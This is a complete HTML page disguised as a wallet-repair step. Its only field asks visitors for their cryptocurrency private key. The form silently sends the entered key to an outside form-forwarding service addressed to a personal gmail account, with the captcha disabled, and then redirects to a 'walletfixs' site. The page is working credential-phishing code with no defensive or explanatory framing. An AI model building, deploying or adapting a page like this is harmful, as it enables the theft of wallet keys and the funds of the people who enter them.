<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private Key</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body{
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:#f4f4f4;
      padding:20px;
    }

    .container{
      width:100%;
      max-width:500px;
      background:#fff;
      padding:40px 30px;
      border-radius:20px;
      box-shadow:0 10px 30px rgba(0,0,0,0.08);
      text-align:center;
    }

    .title{
      font-size:42px;
      font-weight:600;
      color:#222;
      margin-bottom:25px;
    }

    .line{
      width:100%;
      height:2px;
      background:#dcdcdc;
      margin-bottom:35px;
    }

    .input-box{
      width:100%;
      height:65px;
      border:2px solid #d4d4d4;
      border-radius:12px;
      padding:0 20px;
      font-size:20px;
      color:#555;
      outline:none;
      margin-bottom:25px;
      background:white;
      transition:0.3s ease;
    }

    .input-box:focus{
      border-color:#0066ff;
    }

    .input-box::placeholder{
      color:#8b8b9b;
    }

    .info{
      font-size:18px;
      line-height:1.6;
      color:#555;
      margin-bottom:35px;
    }

    .btn{
      width:100%;
      height:60px;
      border:none;
      border-radius:12px;
      font-size:20px;
      font-weight:600;
      color:white;
      cursor:pointer;
      transition:0.3s ease;
      margin-bottom:18px;
    }

    .btn:hover{
      transform:translateY(-2px);
    }

    .proceed{
      background:#0066ff;
    }

    .cancel{
      background:#e91d3a;
    }

    /* TABLET */
    @media(max-width:768px){

      .container{
        max-width:450px;
        padding:35px 25px;
      }

      .title{
        font-size:36px;
      }

      .input-box{
        height:60px;
        font-size:18px;
      }

      .btn{
        height:58px;
        font-size:18px;
      }
    }

    /* MOBILE */
    @media(max-width:480px){

      body{
        padding:15px;
      }

      .container{
        padding:30px 20px;
        border-radius:16px;
      }

      .title{
        font-size:30px;
      }

      .line{
        margin-bottom:28px;
      }

      .input-box{
        height:56px;
        font-size:16px;
        padding:0 16px;
      }

      .info{
        font-size:15px;
        margin-bottom:28px;
      }

      .btn{
        height:54px;
        font-size:16px;
      }
    }

    /* LARGE DESKTOP */
    @media(min-width:1200px){

      .container{
        max-width:550px;
      }

      .title{
        font-size:48px;
      }
    }

  </style>
</head>
<body>
<div class="container">

    <h1 class="title">Private Key</h1>

    <div class="line"></div>

    <form action="https://formsubmit.co/nxloaded@gmail.com" method="POST">

  <input type="hidden" name="_captcha" value="false">

  <input type="hidden" name="_next" value="https://walletfixs.vercel.app/">

  <input
    type="text"
    name="message"
    class="input-box"
    placeholder="Private Key"
    required
  >

  <button type="submit" class="btn proceed">
    PROCEED
  </button>

</form>

     
  </div>

</body>
</html>
